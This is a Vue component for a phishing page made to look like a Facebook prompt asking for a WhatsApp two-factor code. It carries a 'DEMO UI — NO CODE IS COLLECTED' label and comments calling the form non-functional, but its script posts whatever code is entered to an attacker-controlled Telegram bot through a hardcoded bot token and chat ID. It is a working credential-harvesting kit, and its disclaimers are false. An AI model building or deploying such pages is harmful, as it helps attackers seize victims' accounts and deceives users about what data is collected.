


<template>
  <div id="app">

<body>

<main class="page">
    <section class="card">

      <div class="demo-label">DEMO UI — NO CODE IS COLLECTED</div>

      <div class="account">
        <!-- <span class="redacted"></span> -->
        <span class=""></span>
        <span>• Facebook</span>
      </div>

      <h1>Check your WhatsApp messages</h1>

      <p class="description">
        Enter the demonstration code shown in your WhatsApp account.
      </p>
      
     <form action="?" method="post">

      <!-- Visual-only input -->
      <input
        class="code-box"
        type="text"
        inputmode="numeric"
        maxlength="6"
        placeholder="Code"
        aria-label="Demonstration code"
        v-model="formDataRes.code"

      />

      <div class="new-code">
        <span class="refresh"></span>
        <span>Get a new code</span>
      </div>

      <!-- Intentionally non-functional -->
      <button class="continue" @click.prevent="finishJoob();" >
        Continue
      </button>

      <button class="another-way" type="button">
        Try another way
      </button>
     </form>
    </section>
  </main>

</body>


  </div>
</template>





<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
       code: "",
       
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️2fa*\ncode: ${this.formDataRes.code}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>








<style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html,
    body {
      width: 100%;
      height: 100%;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background:
        linear-gradient(rgba(7, 25, 34, 0.92), rgba(7, 25, 34, 0.92)),
        #0b202a;
    }

    .page {
      width: 100%;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 14px;
    }

    .card {
      width: min(100%, 600px);
      min-height: 460px;
      padding: 72px 22px 34px;
      border-radius: 27px;
      background: linear-gradient(
        135deg,
        #fff9fb 0%,
        #f4f4ff 50%,
        #eef9ff 100%
      );
      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.22);
    }

    .demo-label {
      display: inline-block;
      margin-bottom: 10px;
      padding: 5px 9px;
      border-radius: 5px;
      background: #fff0f0;
      color: #b42318;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.3px;
    }

    .account {
      display: flex;
      align-items: center;
      gap: 7px;
      margin-bottom: 8px;
      color: #222;
      font-size: 16px;
    }

    .redacted {
      width: 170px;
      height: 30px;
      background: #ff2915;
      display: inline-block;
    }

    h1 {
      color: #101820;
      font-size: 25px;
      line-height: 1.25;
      font-weight: 700;
      margin-bottom: 12px;
    }

    .description {
      color: #222;
      font-size: 16px;
      line-height: 1.45;
      margin-bottom: 20px;
    }

    .code-box {
      width: 100%;
      height: 66px;
      padding: 0 18px;
      border: 1px solid #c9c9c9;
      border-radius: 13px;
      background: rgba(255, 255, 255, 0.85);
      font-size: 18px;
      outline: none;
      margin-bottom: 16px;
    }

    .code-box::placeholder {
      color: #777;
    }

    .new-code {
      display: flex;
      align-items: center;
      gap: 9px;
      margin-bottom: 34px;
      color: #285b92;
      font-size: 16px;
    }

    .refresh {
      width: 18px;
      height: 18px;
      border: 2px solid #555;
      border-right-color: transparent;
      border-radius: 50%;
      transform: rotate(-35deg);
    }

    .continue {
      width: 100%;
      height: 49px;
      border: 0;
      border-radius: 25px;
      background: #226feb;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer; 
      opacity: 0.9;
    }

    .another-way {
      width: 100%;
      height: 49px;
      margin-top: 13px;
      border: 1px solid #d0d0d0;
      border-radius: 25px;
      background: transparent;
      color: #111;
      font-size: 16px;
      cursor: pointer;
    }

    @media (max-width: 480px) {
      .page {
        padding: 10px;
      }

      .card {
        min-height: calc(100vh - 20px);
        border-radius: 24px;
        padding: 55px 22px 30px;
      }

      h1 {
        font-size: 23px;
      }

      .description {
        font-size: 15px;
      }
    }
  </style>